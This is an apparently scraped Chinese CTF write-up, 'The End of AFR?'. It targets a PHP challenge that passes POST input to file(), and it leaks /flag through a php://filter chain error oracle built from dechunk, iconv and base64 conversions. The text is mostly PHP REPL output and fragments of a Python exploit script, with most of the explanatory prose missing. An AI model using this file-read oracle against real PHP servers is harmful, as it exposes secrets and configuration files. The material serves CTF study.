# The End of AFR?

> 原文: https://www.ctfiot.com/59318.html
> ID: 59318

推荐阅读：

java免杀合集

ATT&CK中的攻与防——T1059

若依(RuoYi)管理系统后台sql注入漏洞分析

利用 PHP-FPM 做内存马的方法

一种新的Tomcat内存马 – Upgrade内存马

跳跳糖持续向广大安全从业者征集高质量技术文章，可以是漏洞分析，事件分析，渗透技巧，安全工具等等。

通过审核且发布将予以500RMB-1000RMB不等的奖励，具体文章要求可以查看“投稿须知”。

阅读更多原创技术文章，戳“阅读全文”


```
<?php file($_POST[0]);
FROM php:8.1-apache

RUN mv "$PHP_INI_DIR/php.ini-production" "$PHP_INI_DIR/php.ini"

COPY index.php /var/www/html/index.php
COPY flag /flag
php > var_dump(file_get_contents("php://filter/dechunk/resource=data:,a"));
string(0) ""
php > var_dump(file_get_contents("php://filter/dechunk/resource=data:,g"));
string(1) "g"
php > var_dump(file_get_contents("php://filter/dechunk/resource=data:,ga"));
string(2) "ga"
php > var_dump(file_get_contents("php://filter/dechunk/resource=data:,ag"));
string(0) ""
var_dump(file_get_contents("php://filter/convert.base64-encode|convert.base64-encode|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE/resource=/flag"));
var_dump(file_get_contents("php://filter/convert.base64-encode|convert.base64-encode|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE/resource=/flag"));
var_dump(file_get_contents("php://filter/dechunk|convert.base64-encode|convert.base64-encode|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE/resource=/flag"));
php > var_dump(file_get_contents("php://filter/convert.iconv.CSUNICODE.UCS-2BE/resource=data:,abcdefgh"));
string(6) "badcfehg"
php > var_dump(file_get_contents("php://filter/convert.iconv.UCS-4LE.10646-1:
1993/resource=data:,abcdefgh"));
string(8) "dcbahgfe"
php > var_dump(file_get_contents("php://filter/convert.iconv.CSUNICODE.UCS-2BE/resource=data:,abcdefgh"));
string(6) "badcfehg"
php > var_dump(file_get_contents("php://filter/convert.iconv.CSUNICODE.UCS-2BE|convert.iconv.UCS-4LE.10646-1:
1993/resource=data:,abcdefgh"));
string(8) "cdabghef"
// 产生填充字符
php > var_dump(file_get_contents("php://filter/convert.iconv.CSUNICODE.CSUNICODE/resource=data:,abcdef"));
string(8) "��abcdef"

// 使用 r4 进行移位
php > var_dump(file_get_contents("php://filter/convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:
1993/resource=data:,abcdef"));
string(8) "ba��fedc"

// 使用 base64 去掉冗余位
php > var_dump(file_get_contents("php://filter/convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:
1993|convert.base64-decode|convert.base64-encode/resource=data:,abcdef"));
string(8) "bafedQ=="

// 再次使用 r4 交换位置
php > var_dump(file_get_contents("php://filter/convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:
1993|convert.base64-decode|convert.base64-encode|convert.iconv.UCS-4LE.10646-1:
1993/resource=data:,abcdef"));
string(8) "efab==Qd"
php > var_dump(file_get_contents("php://filter/convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7/resource=data:,=="));
string(24) "+---AD0-3D3D+---AD0-3D3D"
// 将等号进行转换
php > var_dump(file_get_contents("php://filter/convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7/resource=data:,abcdefghij=="));
string(34) "abcdefghij+---AD0-3D3D+---AD0-3D3D"

// 在前端添加冗余字符串
php > var_dump(file_get_contents("php://filter/convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE/resource=data:,abcdefghij=="));
string(36) "��abcdefghij+---AD0-3D3D+---AD0-3D3D"

// 使用 r4
php > var_dump(file_get_contents("php://filter/convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:
1993/resource=data:,abcdefghij=="));
string(36) "ba��fedcjihg---+-0DAD3D3---+-0DAD3D3"

// 去除冗余
php > var_dump(file_get_contents("php://filter/convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:
1993|convert.base64-decode|convert.base64-encode/resource=data:,abcdefghij=="));
string(28) "bafedcjihg+0DAD3D3+0DAD3Dw=="
abcd efgh ijkl mnop ->flip-> 
bafe dcji hg+0 DAD3 ->r4->
efab ijcd 0+gh ->flip->
feji ba+0 dcD3 ->r4->
ijef 0+ab 3Dcd
def get_nth(n):
    global flip, r2, r4
    o = []
    chunk = n // 2
    if chunk % 2 == 1: o.append(r4)
    o.extend([flip, r4] * (chunk // 2))
    if (n % 2 == 1) ^ (chunk % 2 == 1): o.append(r2)
    return join(*o)
print('detecting equals')
j = [
    req(f'convert.base64-encode|convert.base64-encode|{blow_up_enc}|{trailer}'),
    req(f'convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode{blow_up_enc}|{trailer}'),
    req(f'convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KR|convert.base64-encode|{blow_up_enc}|{trailer}')
]
print(j)
if sum(j) != 2:
    err('something wrong')
if j[0] == False:
    header = f'convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode'
elif j[1] == False:
    header = f'convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KR|convert.base64-encode'
elif j[2] == False:
    header = f'convert.base64-encode|convert.base64-encode'
else:
    err('something wrong')
print(f'j: {j}')
print(f'header: {header}')
rot1 = 'convert.iconv.437.CP930'
# 会将字母向后移动一位，所以称呼为 rot1 ，比如 a->b, b->c
# 但是只对部分字母有效，初步测试为 a-h 范围，不包括数字，其他字母会有其他规则 i->q ，后续就不是 rot1 了
rot13 = 'string.rot13'
# rot13 算法，向后移动 13 位
tolower = 'string.tolower'
# 将大写字母转换成小写
php > var_dump(file_get_contents("php://filter/convert.iconv.437.CP930|dechunk/resource=data:,a"));
string(0) ""
php > var_dump(file_get_contents("php://filter/convert.iconv.437.CP930|dechunk/resource=data:,e"));
string(0) ""
php > var_dump(file_get_contents("php://filter/convert.iconv.437.CP930|dechunk/resource=data:,f"));
string(1) "g"
php > var_dump(file_get_contents("php://filter/convert.iconv.CP1390.CSIBM932|dechunk/resource=data:,f"));
string(0) ""
php > var_dump(file_get_contents("php://filter/convert.iconv.CP1390.CSIBM932|dechunk/resource=data:,0"));
string(1) ""
// ... 此处省略，该 filter 对于数字都会产生一个不可见字符，感兴趣的读者自行尝试
php > var_dump(file_get_contents("php://filter/convert.iconv.CP1390.CSIBM932|dechunk/resource=data:,9"));
string(1) ""
elif not req(f'{prefix}|convert.iconv.CSISO5427CYRILLIC.855|dechunk|{blow_up_inf}'):
            return '*'
# a-e
for n in range(5):
    if req(f'{prefix}|' + f'{rot1}|{be}|'*(n+1) + f'{rot1}|dechunk|{blow_up_inf}'):
        return 'edcba'[n]
    break
// i-k 经过 rot1 后的结果，其余字母都不满足后续要求所以此处只写 i-k
php > var_dump(file_get_contents("php://filter/convert.iconv.437.CP930/resource=data:,i"));
string(1) "q"
php > var_dump(file_get_contents("php://filter/convert.iconv.437.CP930/resource=data:,j"));
string(1) "r"
php > var_dump(file_get_contents("php://filter/convert.iconv.437.CP930/resource=data:,k"));
string(1) "s"
// 再使用 string.ro13 可以得到 d-f ，可以复用之前 a-f 的逻辑，此处不再演示
0-3 -> M
4-7 -> N
8-9 -> O
0 -> CDEFGH
1 -> STUVWX
2 -> ijklmn
3 -> yz*
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/7-1664333274.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/0-1664333275.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/6-1664333276.png)